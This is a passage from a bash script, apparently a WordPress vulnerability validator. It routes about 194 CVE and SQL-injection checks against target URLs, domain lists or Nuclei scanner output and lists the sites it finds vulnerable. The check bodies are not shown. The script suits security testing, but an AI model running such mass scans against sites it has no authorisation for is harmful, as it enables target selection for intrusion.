        *CVE-2022-0439*) _check_CVE_2022_0439 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2022-0479*) _check_CVE_2022_0479 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2022-0592*) _check_CVE_2022_0592 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2022-0651*) _check_CVE_2022_0651 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2022-0658*) _check_CVE_2022_0658 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2022-0693*) _check_CVE_2022_0693 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2022-0747*) _check_CVE_2022_0747 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2022-0760*) _check_CVE_2022_0760 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2022-0769*) _check_CVE_2022_0769 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2022-0773*) _check_CVE_2022_0773 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2022-0781*) _check_CVE_2022_0781 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2022-0783*) _check_CVE_2022_0783 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2022-0784*) _check_CVE_2022_0784 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2022-0785*) _check_CVE_2022_0785 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2022-0786*) _check_CVE_2022_0786 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2022-0787*) _check_CVE_2022_0787 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2022-0788*) _check_CVE_2022_0788 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2022-0814*) _check_CVE_2022_0814 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2022-0817*) _check_CVE_2022_0817 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2022-0826*) _check_CVE_2022_0826 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2022-0827*) _check_CVE_2022_0827 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2022-0846*) _check_CVE_2022_0846 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2022-0867*) _check_CVE_2022_0867 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2022-0948*) _check_CVE_2022_0948 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2022-0949*) _check_CVE_2022_0949 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2022-1013*) _check_CVE_2022_1013 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2022-1057*) _check_CVE_2022_1057 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2022-1453*) _check_CVE_2022_1453 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2022-1768*) _check_CVE_2022_1768 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2022-1950*) _check_CVE_2022_1950 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2022-21661*) _check_CVE_2022_21661 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2022-25148*) _check_CVE_2022_25148 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2022-25149*) _check_CVE_2022_25149 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2022-3142*) _check_CVE_2022_3142 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2022-3254*) _check_CVE_2022_3254 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2022-33965*) _check_CVE_2022_33965 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2022-3481*) _check_CVE_2022_3481 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2022-3768*) _check_CVE_2022_3768 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2022-4049*) _check_CVE_2022_4049 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2022-4050*) _check_CVE_2022_4050 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2022-4059*) _check_CVE_2022_4059 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2022-4117*) _check_CVE_2022_4117 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2022-4447*) _check_CVE_2022_4447 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2022-44588*) _check_CVE_2022_44588 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2022-45805*) _check_CVE_2022_45805 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2022-45808*) _check_CVE_2022_45808 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2023-0037*) _check_CVE_2023_0037 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2023-0261*) _check_CVE_2023_0261 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2023-0600*) _check_CVE_2023_0600 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2023-0630*) _check_CVE_2023_0630 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2023-0900*) _check_CVE_2023_0900 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2023-1020*) _check_CVE_2023_1020 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2023-1408*) _check_CVE_2023_1408 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2023-1730*) _check_CVE_2023_1730 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2023-23488*) _check_CVE_2023_23488 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2023-23489*) _check_CVE_2023_23489 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2023-24000*) _check_CVE_2023_24000 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2023-2437*) _check_CVE_2023_2437 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2023-2449*) _check_CVE_2023_2449 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2023-28121*) _check_CVE_2023_28121 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2023-28662*) _check_CVE_2023_28662 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2023-28787*) _check_CVE_2023_28787 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2023-3076*) _check_CVE_2023_3076 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2023-3077*) _check_CVE_2023_3077 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2023-3197*) _check_CVE_2023_3197 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2023-32243*) _check_CVE_2023_32243 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2023-32590*) _check_CVE_2023_32590 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2023-3460*) _check_CVE_2023_3460 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2023-4490*) _check_CVE_2023_4490 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2023-50839*) _check_CVE_2023_50839 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2023-5203*) _check_CVE_2023_5203 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2023-5204*) _check_CVE_2023_5204 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2023-5652*) _check_CVE_2023_5652 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2023-6009*) _check_CVE_2023_6009 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2023-6030*) _check_CVE_2023_6030 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2023-6063*) _check_CVE_2023_6063 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2023-6360*) _check_CVE_2023_6360 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2023-6567*) _check_CVE_2023_6567 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2023-7337*) _check_CVE_2023_7337 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2024-0705*) _check_CVE_2024_0705 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2024-10400*) _check_CVE_2024_10400 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2024-1061*) _check_CVE_2024_1061 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2024-1071*) _check_CVE_2024_1071 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2024-10924*) _check_CVE_2024_10924 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2024-11728*) _check_CVE_2024_11728 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2024-12025*) _check_CVE_2024_12025 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2024-13322*) _check_CVE_2024_13322 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2024-13496*) _check_CVE_2024_13496 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2024-13726*) _check_CVE_2024_13726 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2024-1512*) _check_CVE_2024_1512 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2024-1698*) _check_CVE_2024_1698 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2024-1751*) _check_CVE_2024_1751 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2024-27956*) _check_CVE_2024_27956 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2024-28000*) _check_CVE_2024_28000 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2024-2876*) _check_CVE_2024_2876 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2024-2879*) _check_CVE_2024_2879 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2024-30490*) _check_CVE_2024_30490 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2024-30498*) _check_CVE_2024_30498 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2024-30502*) _check_CVE_2024_30502 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2024-32128*) _check_CVE_2024_32128 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2024-32709*) _check_CVE_2024_32709 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2024-3495*) _check_CVE_2024_3495 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2024-3552*) _check_CVE_2024_3552 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2024-35700*) _check_CVE_2024_35700 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2024-3605*) _check_CVE_2024_3605 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2024-3922*) _check_CVE_2024_3922 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2024-4295*) _check_CVE_2024_4295 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2024-43917*) _check_CVE_2024_43917 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2024-43965*) _check_CVE_2024_43965 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2024-4434*) _check_CVE_2024_4434 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2024-4443*) _check_CVE_2024_4443 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2024-5057*) _check_CVE_2024_5057 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2024-5522*) _check_CVE_2024_5522 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2024-5765*) _check_CVE_2024_5765 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2024-5975*) _check_CVE_2024_5975 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2024-6028*) _check_CVE_2024_6028 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2024-6159*) _check_CVE_2024_6159 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2024-6205*) _check_CVE_2024_6205 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2024-6265*) _check_CVE_2024_6265 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2024-6924*) _check_CVE_2024_6924 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2024-6926*) _check_CVE_2024_6926 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2024-6928*) _check_CVE_2024_6928 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2024-7854*) _check_CVE_2024_7854 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2024-8484*) _check_CVE_2024_8484 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2024-8522*) _check_CVE_2024_8522 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2024-8529*) _check_CVE_2024_8529 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2024-8625*) _check_CVE_2024_8625 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2024-8911*) _check_CVE_2024_8911 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2024-9186*) _check_CVE_2024_9186 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2024-9796*) _check_CVE_2024_9796 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2024-9863*) _check_CVE_2024_9863 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2025-13138*) _check_CVE_2025_13138 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2025-1323*) _check_CVE_2025_1323 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2025-2010*) _check_CVE_2025_2010 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2025-2011*) _check_CVE_2025_2011 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2025-22785*) _check_CVE_2025_22785 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2025-4396*) _check_CVE_2025_4396 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2025-48281*) _check_CVE_2025_48281 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2025-5287*) _check_CVE_2025_5287 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2025-54726*) _check_CVE_2025_54726 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2025-6970*) _check_CVE_2025_6970 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2025-8489*) _check_CVE_2025_8489 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2026-1492*) _check_CVE_2026_1492 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2026-2413*) _check_CVE_2026_2413 "$BASE_URL" "$DOMAIN" ;;
        *advanced-booking-calendar-sqli*) _check_advanced_booking_calendar_sqli "$BASE_URL" "$DOMAIN" ;;
        *contus-video-gallery-sqli*) _check_contus_video_gallery_sqli "$BASE_URL" "$DOMAIN" ;;
        *leaguemanager-sql-injection*) _check_leaguemanager_sql_injection "$BASE_URL" "$DOMAIN" ;;
        *notificationx-sqli*) _check_notificationx_sqli "$BASE_URL" "$DOMAIN" ;;
        *wp-adivaha-sqli*) _check_wp_adivaha_sqli "$BASE_URL" "$DOMAIN" ;;
        *wp-autosuggest-sql-injection*) _check_wp_autosuggest_sql_injection "$BASE_URL" "$DOMAIN" ;;
        *wp-smart-manager-sqli*) _check_wp_smart_manager_sqli "$BASE_URL" "$DOMAIN" ;;
        *wp-statistics-sqli*) _check_wp_statistics_sqli "$BASE_URL" "$DOMAIN" ;;
        *zero-spam-sql-injection*) _check_zero_spam_sql_injection "$BASE_URL" "$DOMAIN" ;;
            *) echo -e "${RED}  Unknown: ${CVE_HINT}${NC}" ;;
        esac
    else
    _check_CVE_2015_2196 "$BASE_URL" "$DOMAIN"
    _check_CVE_2015_4062 "$BASE_URL" "$DOMAIN"
    _check_CVE_2015_9323 "$BASE_URL" "$DOMAIN"
    _check_CVE_2016_10940 "$BASE_URL" "$DOMAIN"
    _check_CVE_2017_8295 "$BASE_URL" "$DOMAIN"
    _check_CVE_2018_16159 "$BASE_URL" "$DOMAIN"
    _check_CVE_2019_10692 "$BASE_URL" "$DOMAIN"
    _check_CVE_2020_11530 "$BASE_URL" "$DOMAIN"
    _check_CVE_2020_13640 "$BASE_URL" "$DOMAIN"
    _check_CVE_2020_14092 "$BASE_URL" "$DOMAIN"
    _check_CVE_2020_27481 "$BASE_URL" "$DOMAIN"
    _check_CVE_2020_27615 "$BASE_URL" "$DOMAIN"
    _check_CVE_2020_5766 "$BASE_URL" "$DOMAIN"
    _check_CVE_2020_8772 "$BASE_URL" "$DOMAIN"
    _check_CVE_2021_24139 "$BASE_URL" "$DOMAIN"
    _check_CVE_2021_24285 "$BASE_URL" "$DOMAIN"
    _check_CVE_2021_24295 "$BASE_URL" "$DOMAIN"
    _check_CVE_2021_24340 "$BASE_URL" "$DOMAIN"
    _check_CVE_2021_24442 "$BASE_URL" "$DOMAIN"
    _check_CVE_2021_24554 "$BASE_URL" "$DOMAIN"
    _check_CVE_2021_24627 "$BASE_URL" "$DOMAIN"
    _check_CVE_2021_24666 "$BASE_URL" "$DOMAIN"
    _check_CVE_2021_24731 "$BASE_URL" "$DOMAIN"
    _check_CVE_2021_24750 "$BASE_URL" "$DOMAIN"
    _check_CVE_2021_24762 "$BASE_URL" "$DOMAIN"
    _check_CVE_2021_24786 "$BASE_URL" "$DOMAIN"
    _check_CVE_2021_24791 "$BASE_URL" "$DOMAIN"
    _check_CVE_2021_24827 "$BASE_URL" "$DOMAIN"
    _check_CVE_2021_24849 "$BASE_URL" "$DOMAIN"
    _check_CVE_2021_24862 "$BASE_URL" "$DOMAIN"
    _check_CVE_2021_24915 "$BASE_URL" "$DOMAIN"
    _check_CVE_2021_24931 "$BASE_URL" "$DOMAIN"
    _check_CVE_2021_24943 "$BASE_URL" "$DOMAIN"
    _check_CVE_2021_24946 "$BASE_URL" "$DOMAIN"
    _check_CVE_2021_25114 "$BASE_URL" "$DOMAIN"
    _check_CVE_2021_32789 "$BASE_URL" "$DOMAIN"
    _check_CVE_2022_0169 "$BASE_URL" "$DOMAIN"
    _check_CVE_2022_0228 "$BASE_URL" "$DOMAIN"
    _check_CVE_2022_0349 "$BASE_URL" "$DOMAIN"
    _check_CVE_2022_0412 "$BASE_URL" "$DOMAIN"
    _check_CVE_2022_0434 "$BASE_URL" "$DOMAIN"
    _check_CVE_2022_0439 "$BASE_URL" "$DOMAIN"
    _check_CVE_2022_0479 "$BASE_URL" "$DOMAIN"
    _check_CVE_2022_0592 "$BASE_URL" "$DOMAIN"
    _check_CVE_2022_0651 "$BASE_URL" "$DOMAIN"
    _check_CVE_2022_0658 "$BASE_URL" "$DOMAIN"
    _check_CVE_2022_0693 "$BASE_URL" "$DOMAIN"
    _check_CVE_2022_0747 "$BASE_URL" "$DOMAIN"
    _check_CVE_2022_0760 "$BASE_URL" "$DOMAIN"
    _check_CVE_2022_0769 "$BASE_URL" "$DOMAIN"
    _check_CVE_2022_0773 "$BASE_URL" "$DOMAIN"
    _check_CVE_2022_0781 "$BASE_URL" "$DOMAIN"
    _check_CVE_2022_0783 "$BASE_URL" "$DOMAIN"
    _check_CVE_2022_0784 "$BASE_URL" "$DOMAIN"
    _check_CVE_2022_0785 "$BASE_URL" "$DOMAIN"
    _check_CVE_2022_0786 "$BASE_URL" "$DOMAIN"
    _check_CVE_2022_0787 "$BASE_URL" "$DOMAIN"
    _check_CVE_2022_0788 "$BASE_URL" "$DOMAIN"
    _check_CVE_2022_0814 "$BASE_URL" "$DOMAIN"
    _check_CVE_2022_0817 "$BASE_URL" "$DOMAIN"
    _check_CVE_2022_0826 "$BASE_URL" "$DOMAIN"
    _check_CVE_2022_0827 "$BASE_URL" "$DOMAIN"
    _check_CVE_2022_0846 "$BASE_URL" "$DOMAIN"
    _check_CVE_2022_0867 "$BASE_URL" "$DOMAIN"
    _check_CVE_2022_0948 "$BASE_URL" "$DOMAIN"
    _check_CVE_2022_0949 "$BASE_URL" "$DOMAIN"
    _check_CVE_2022_1013 "$BASE_URL" "$DOMAIN"
    _check_CVE_2022_1057 "$BASE_URL" "$DOMAIN"
    _check_CVE_2022_1453 "$BASE_URL" "$DOMAIN"
    _check_CVE_2022_1768 "$BASE_URL" "$DOMAIN"
    _check_CVE_2022_1950 "$BASE_URL" "$DOMAIN"
    _check_CVE_2022_21661 "$BASE_URL" "$DOMAIN"
    _check_CVE_2022_25148 "$BASE_URL" "$DOMAIN"
    _check_CVE_2022_25149 "$BASE_URL" "$DOMAIN"
    _check_CVE_2022_3142 "$BASE_URL" "$DOMAIN"
    _check_CVE_2022_3254 "$BASE_URL" "$DOMAIN"
    _check_CVE_2022_33965 "$BASE_URL" "$DOMAIN"
    _check_CVE_2022_3481 "$BASE_URL" "$DOMAIN"
    _check_CVE_2022_3768 "$BASE_URL" "$DOMAIN"
    _check_CVE_2022_4049 "$BASE_URL" "$DOMAIN"
    _check_CVE_2022_4050 "$BASE_URL" "$DOMAIN"
    _check_CVE_2022_4059 "$BASE_URL" "$DOMAIN"
    _check_CVE_2022_4117 "$BASE_URL" "$DOMAIN"
    _check_CVE_2022_4447 "$BASE_URL" "$DOMAIN"
    _check_CVE_2022_44588 "$BASE_URL" "$DOMAIN"
    _check_CVE_2022_45805 "$BASE_URL" "$DOMAIN"
    _check_CVE_2022_45808 "$BASE_URL" "$DOMAIN"
    _check_CVE_2023_0037 "$BASE_URL" "$DOMAIN"
    _check_CVE_2023_0261 "$BASE_URL" "$DOMAIN"
    _check_CVE_2023_0600 "$BASE_URL" "$DOMAIN"
    _check_CVE_2023_0630 "$BASE_URL" "$DOMAIN"
    _check_CVE_2023_0900 "$BASE_URL" "$DOMAIN"
    _check_CVE_2023_1020 "$BASE_URL" "$DOMAIN"
    _check_CVE_2023_1408 "$BASE_URL" "$DOMAIN"
    _check_CVE_2023_1730 "$BASE_URL" "$DOMAIN"
    _check_CVE_2023_23488 "$BASE_URL" "$DOMAIN"
    _check_CVE_2023_23489 "$BASE_URL" "$DOMAIN"
    _check_CVE_2023_24000 "$BASE_URL" "$DOMAIN"
    _check_CVE_2023_2437 "$BASE_URL" "$DOMAIN"
    _check_CVE_2023_2449 "$BASE_URL" "$DOMAIN"
    _check_CVE_2023_28121 "$BASE_URL" "$DOMAIN"
    _check_CVE_2023_28662 "$BASE_URL" "$DOMAIN"
    _check_CVE_2023_28787 "$BASE_URL" "$DOMAIN"
    _check_CVE_2023_3076 "$BASE_URL" "$DOMAIN"
    _check_CVE_2023_3077 "$BASE_URL" "$DOMAIN"
    _check_CVE_2023_3197 "$BASE_URL" "$DOMAIN"
    _check_CVE_2023_32243 "$BASE_URL" "$DOMAIN"
    _check_CVE_2023_32590 "$BASE_URL" "$DOMAIN"
    _check_CVE_2023_3460 "$BASE_URL" "$DOMAIN"
    _check_CVE_2023_4490 "$BASE_URL" "$DOMAIN"
    _check_CVE_2023_50839 "$BASE_URL" "$DOMAIN"
    _check_CVE_2023_5203 "$BASE_URL" "$DOMAIN"
    _check_CVE_2023_5204 "$BASE_URL" "$DOMAIN"
    _check_CVE_2023_5652 "$BASE_URL" "$DOMAIN"
    _check_CVE_2023_6009 "$BASE_URL" "$DOMAIN"
    _check_CVE_2023_6030 "$BASE_URL" "$DOMAIN"
    _check_CVE_2023_6063 "$BASE_URL" "$DOMAIN"
    _check_CVE_2023_6360 "$BASE_URL" "$DOMAIN"
    _check_CVE_2023_6567 "$BASE_URL" "$DOMAIN"
    _check_CVE_2023_7337 "$BASE_URL" "$DOMAIN"
    _check_CVE_2024_0705 "$BASE_URL" "$DOMAIN"
    _check_CVE_2024_10400 "$BASE_URL" "$DOMAIN"
    _check_CVE_2024_1061 "$BASE_URL" "$DOMAIN"
    _check_CVE_2024_1071 "$BASE_URL" "$DOMAIN"
    _check_CVE_2024_10924 "$BASE_URL" "$DOMAIN"
    _check_CVE_2024_11728 "$BASE_URL" "$DOMAIN"
    _check_CVE_2024_12025 "$BASE_URL" "$DOMAIN"
    _check_CVE_2024_13322 "$BASE_URL" "$DOMAIN"
    _check_CVE_2024_13496 "$BASE_URL" "$DOMAIN"
    _check_CVE_2024_13726 "$BASE_URL" "$DOMAIN"
    _check_CVE_2024_1512 "$BASE_URL" "$DOMAIN"
    _check_CVE_2024_1698 "$BASE_URL" "$DOMAIN"
    _check_CVE_2024_1751 "$BASE_URL" "$DOMAIN"
    _check_CVE_2024_27956 "$BASE_URL" "$DOMAIN"
    _check_CVE_2024_28000 "$BASE_URL" "$DOMAIN"
    _check_CVE_2024_2876 "$BASE_URL" "$DOMAIN"
    _check_CVE_2024_2879 "$BASE_URL" "$DOMAIN"
    _check_CVE_2024_30490 "$BASE_URL" "$DOMAIN"
    _check_CVE_2024_30498 "$BASE_URL" "$DOMAIN"
    _check_CVE_2024_30502 "$BASE_URL" "$DOMAIN"
    _check_CVE_2024_32128 "$BASE_URL" "$DOMAIN"
    _check_CVE_2024_32709 "$BASE_URL" "$DOMAIN"
    _check_CVE_2024_3495 "$BASE_URL" "$DOMAIN"
    _check_CVE_2024_3552 "$BASE_URL" "$DOMAIN"
    _check_CVE_2024_35700 "$BASE_URL" "$DOMAIN"
    _check_CVE_2024_3605 "$BASE_URL" "$DOMAIN"
    _check_CVE_2024_3922 "$BASE_URL" "$DOMAIN"
    _check_CVE_2024_4295 "$BASE_URL" "$DOMAIN"
    _check_CVE_2024_43917 "$BASE_URL" "$DOMAIN"
    _check_CVE_2024_43965 "$BASE_URL" "$DOMAIN"
    _check_CVE_2024_4434 "$BASE_URL" "$DOMAIN"
    _check_CVE_2024_4443 "$BASE_URL" "$DOMAIN"
    _check_CVE_2024_5057 "$BASE_URL" "$DOMAIN"
    _check_CVE_2024_5522 "$BASE_URL" "$DOMAIN"
    _check_CVE_2024_5765 "$BASE_URL" "$DOMAIN"
    _check_CVE_2024_5975 "$BASE_URL" "$DOMAIN"
    _check_CVE_2024_6028 "$BASE_URL" "$DOMAIN"
    _check_CVE_2024_6159 "$BASE_URL" "$DOMAIN"
    _check_CVE_2024_6205 "$BASE_URL" "$DOMAIN"
    _check_CVE_2024_6265 "$BASE_URL" "$DOMAIN"
    _check_CVE_2024_6924 "$BASE_URL" "$DOMAIN"
    _check_CVE_2024_6926 "$BASE_URL" "$DOMAIN"
    _check_CVE_2024_6928 "$BASE_URL" "$DOMAIN"
    _check_CVE_2024_7854 "$BASE_URL" "$DOMAIN"
    _check_CVE_2024_8484 "$BASE_URL" "$DOMAIN"
    _check_CVE_2024_8522 "$BASE_URL" "$DOMAIN"
    _check_CVE_2024_8529 "$BASE_URL" "$DOMAIN"
    _check_CVE_2024_8625 "$BASE_URL" "$DOMAIN"
    _check_CVE_2024_8911 "$BASE_URL" "$DOMAIN"
    _check_CVE_2024_9186 "$BASE_URL" "$DOMAIN"
    _check_CVE_2024_9796 "$BASE_URL" "$DOMAIN"
    _check_CVE_2024_9863 "$BASE_URL" "$DOMAIN"
    _check_CVE_2025_13138 "$BASE_URL" "$DOMAIN"
    _check_CVE_2025_1323 "$BASE_URL" "$DOMAIN"
    _check_CVE_2025_2010 "$BASE_URL" "$DOMAIN"
    _check_CVE_2025_2011 "$BASE_URL" "$DOMAIN"
    _check_CVE_2025_22785 "$BASE_URL" "$DOMAIN"
    _check_CVE_2025_4396 "$BASE_URL" "$DOMAIN"
    _check_CVE_2025_48281 "$BASE_URL" "$DOMAIN"
    _check_CVE_2025_5287 "$BASE_URL" "$DOMAIN"
    _check_CVE_2025_54726 "$BASE_URL" "$DOMAIN"
    _check_CVE_2025_6970 "$BASE_URL" "$DOMAIN"
    _check_CVE_2025_8489 "$BASE_URL" "$DOMAIN"
    _check_CVE_2026_1492 "$BASE_URL" "$DOMAIN"
    _check_CVE_2026_2413 "$BASE_URL" "$DOMAIN"
    _check_advanced_booking_calendar_sqli "$BASE_URL" "$DOMAIN"
    _check_contus_video_gallery_sqli "$BASE_URL" "$DOMAIN"
    _check_leaguemanager_sql_injection "$BASE_URL" "$DOMAIN"
    _check_notificationx_sqli "$BASE_URL" "$DOMAIN"
    _check_wp_adivaha_sqli "$BASE_URL" "$DOMAIN"
    _check_wp_autosuggest_sql_injection "$BASE_URL" "$DOMAIN"
    _check_wp_smart_manager_sqli "$BASE_URL" "$DOMAIN"
    _check_wp_statistics_sqli "$BASE_URL" "$DOMAIN"
    _check_zero_spam_sql_injection "$BASE_URL" "$DOMAIN"
    fi
}

if [ "${#POSITIONAL[@]}" -eq 0 ]; then
    echo "Usage: $0 [-o DIR] [--csv] <url|domains.txt|nuclei_output.txt>"
    echo ""
    echo "Options:"
    echo "  -o DIR    Output directory"
    echo "  --csv     Write results.csv"
    echo ""
    echo "Checks: 194 CVEs | 180 SQLi | 7 AuthBypass | 7 PrivEsc"
    exit 1
fi

echo -e "${BOLD}${CYAN}====================================${NC}"
echo -e "${BOLD}  WP Validator — 194 CVEs${NC}"
echo -e "${BOLD}  Output: ${OUTDIR}${NC}"
[ "$CSV_MODE" -eq 1 ] && echo -e "${BOLD}  CSV → ${CSV_FILE}${NC}"
echo -e "${CYAN}====================================${NC}"

INPUT="${POSITIONAL[0]}"
if [ -f "$INPUT" ]; then
    if grep -qP '^\[' "$INPUT"; then
        echo -e "${YELLOW}Nuclei output — routing by template ID${NC}"
        SEEN=""
        while IFS= read -r line; do
            TMPL_ID=$(echo "$line"|grep -oP '^\[([^\]]+)\]'|tr -d '[]')
            URL=$(echo "$line"|grep -oP 'https?://[^\s]+')
            DOMAIN=$(echo "$URL"|grep -oP 'https?://[^/\s]+')
            [ -z "$TMPL_ID" ]||[ -z "$DOMAIN" ] && continue
            PAIR="${DOMAIN}|${TMPL_ID}"
            echo "$SEEN"|grep -qF "$PAIR" && continue
            SEEN="${SEEN}${PAIR}$'\n'"
            validate_domain "$DOMAIN" "$TMPL_ID"
        done < "$INPUT"
    else
        echo -e "${YELLOW}Domain list — ALL checks${NC}"
        while IFS= read -r line; do
            line=$(echo "$line"|tr -d '[:space:]')
            [ -z "$line" ]||[[ "$line" =~ ^# ]] && continue
            [[ "$line" =~ ^https?:// ]]||line="https://${line}"
            validate_domain "$line"
        done < "$INPUT"
    fi
else
    TARGET="$INPUT"
    [[ "$TARGET" =~ ^https?:// ]]||TARGET="https://${TARGET}"
    validate_domain "$TARGET"
fi

echo -e "\n${BOLD}${CYAN}====================================${NC}"
echo -e "${BOLD}  Done. Results: ${OUTDIR}${NC}"
echo -e "${CYAN}====================================${NC}"
[ -f "$RESULTS_FILE" ]&&[ -s "$RESULTS_FILE" ]&&{ echo -e "\n${RED}${BOLD}VULNERABLE:${NC}"; cat "$RESULTS_FILE"|while IFS= read -r l; do echo -e "  ${RED}${l}${NC}"; done; }
